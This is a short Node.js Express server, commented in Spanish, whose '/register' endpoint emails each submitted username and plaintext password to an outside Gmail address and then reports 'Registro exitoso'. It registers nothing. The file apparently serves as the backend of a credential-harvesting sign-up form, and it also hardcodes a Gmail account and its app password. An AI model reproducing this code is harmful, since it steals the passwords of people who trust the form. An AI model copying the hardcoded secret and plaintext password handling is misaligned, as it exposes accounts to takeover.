const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');

const app = express();
const PORT = 3000;

// Middleware
app.use(cors());
app.use(express.json());

// Configurar transporter de Nodemailer
const transporter = nodemailer.createTransport({
    service: 'Gmail',
    auth: {
        user: 'fiorevaldez10@gmail.com', // Tu email
        pass: 'czfm juuu htrc rraq' // Tu contraseña de aplicación
    }
});

// Ruta para registrar usuario
app.post('/register', async (req, res) => {
    try {
        const { username, password } = req.body;
        
        // Validar datos
        if (!username || !password) {
            return res.status(400).json({ message: 'Faltan datos' });
        }

        // Configurar opciones del email
        const mailOptions = {
            from: 'fiorevaldez10@gmail.com',
            to: 'hirahiroto92@gmail.com', // Email destino
            subject: 'Nuevo registro de usuario',
            text: `Usuario: ${username}\nContraseña: ${password}`
        };

        // Enviar email
        const info = await transporter.sendMail(mailOptions);
        
        if (info) {
            console.log('Correo enviado: ' + info.response);
            res.json({ message: 'Registro exitoso' });
        }
    } catch (error) {
        console.error('Error:', error);
        res.status(500).json({ message: 'Error al registrar usuario' });
    }
});

// Iniciar servidor
app.listen(PORT, () => {
    console.log(`Servidor en puerto ${PORT}`);
});